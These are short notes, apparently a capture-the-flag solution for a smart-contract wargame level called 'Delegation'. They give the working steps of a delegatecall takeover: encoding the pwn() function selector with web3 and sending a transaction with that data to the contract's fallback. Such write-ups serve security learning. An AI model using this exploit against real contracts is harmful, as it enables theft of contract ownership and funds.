# Level 6 - Delegation

- Delegate call vulnerability.
- Execute fallback function with target method ID.
- Find id with → `web3.eth.abi.encodeFunctionSignature("pwn()")`
- Then send transaction to contract with data → `await contract.sendTransaction({data:'0xdd365b8b'})`